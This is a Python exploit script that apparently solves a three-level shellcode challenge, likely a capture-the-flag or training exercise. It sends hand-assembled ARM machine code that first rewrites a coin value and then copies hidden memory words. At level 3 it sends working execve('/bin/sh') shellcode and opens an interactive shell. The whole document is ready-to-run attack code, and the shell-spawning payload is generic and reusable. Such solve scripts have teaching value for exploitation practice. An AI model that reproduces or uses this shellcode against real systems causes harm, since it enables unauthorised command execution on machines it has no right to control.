import interact

p = interact.Process()

# --- LEVEL 1: Modify the Coins ---
# Assembly: mov r1, #6; str r1, [r0]; bx lr
payload1 = "06 10 a0 e3 00 10 80 e5 1e ff 2f e1 #"

p.readuntil("ENTER SHELLCODE BYTES")
print("[*] Passing Level 1 (Setting coins to 6)...")
p.sendline(payload1)

p.readuntil("continue...")
p.sendline("")

# --- LEVEL 2: The Data Segment Secret ---
# Assembly: ldr r1, [r0, #-8]; ldr r2, [r0, #-4]; str r1, [r0]; str r2, [r0, #4]; bx lr
payload2 = "08 10 10 e5 04 20 10 e5 00 10 80 e5 04 20 80 e5 1e ff 2f e1 #"

p.readuntil("ENTER SHELLCODE BYTES")
print("[*] Passing Level 2 (Copying hidden coordinates)...")
p.sendline(payload2)

p.readuntil("continue...")
p.sendline("")

# --- LEVEL 3: Pop the Shell ---
# Assembly: add r0, pc, #12; mov r1, #0; mov r2, #0; mov r7, #11; svc 0; .ascii "/bin/sh\0"
payload3 = "0c 00 8f e2 00 10 a0 e3 00 20 a0 e3 0b 70 a0 e3 00 00 00 ef 2f 62 69 6e 2f 73 68 00 #"

p.readuntil("ENTER SHELLCODE BYTES")
print("[*] Passing Level 3 (Executing execve syscall)...")
p.sendline(payload3)

# Hand control back over to the user to interact with the new shell!
print("[*] Shellcode sent! Enjoy your shell:")
p.interactive()
